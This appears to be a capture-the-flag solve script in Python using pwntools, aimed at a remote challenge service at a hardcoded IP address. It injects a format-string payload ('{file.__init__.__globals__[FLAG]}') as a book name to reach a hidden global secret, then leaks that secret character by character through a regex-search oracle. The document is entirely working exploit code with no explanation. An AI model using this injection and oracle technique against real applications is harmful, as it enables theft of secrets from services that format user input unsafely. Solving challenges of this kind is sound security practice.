from pwn import * 
from string import ascii_lowercase,ascii_uppercase 

context.log_level = 'error'

#Creating a book w/ name = FLAG 
#conn = process(['python3','challenge.py'])
conn = remote('172.190.120.133',50003)
conn.recvuntil(b': ')
conn.sendline(b'7')
conn.recvuntil(b': ')
conn.sendline(b'2')
conn.recvuntil(b': ')
conn.sendline(b'{file.__init__.__globals__[FLAG]}')
for i in range(3): 
    conn.recvuntil(b': ')
    conn.sendline(b'1')
    
#REGEX check for book name 
printable = ascii_lowercase+ ascii_uppercase + '1234567890_!{}' 
print("STARTING REGEX CHECK")
flag = ''
while True: 
    try:
        for i in printable: 
            conn.recvuntil(b'-8): ')
            conn.sendline(b'4')
            conn.recvuntil(b': ')
            payload = flag + i + '.*'
            conn.sendline(payload.encode())
            res = conn.recvline()
            if b'No' not in res: 
                flag +=i
                if i == '}': 
                    print("FOUND",flag)
                    exit()
                print("FOUND",flag)
                break
    except: 
        conn.close()
        exit()
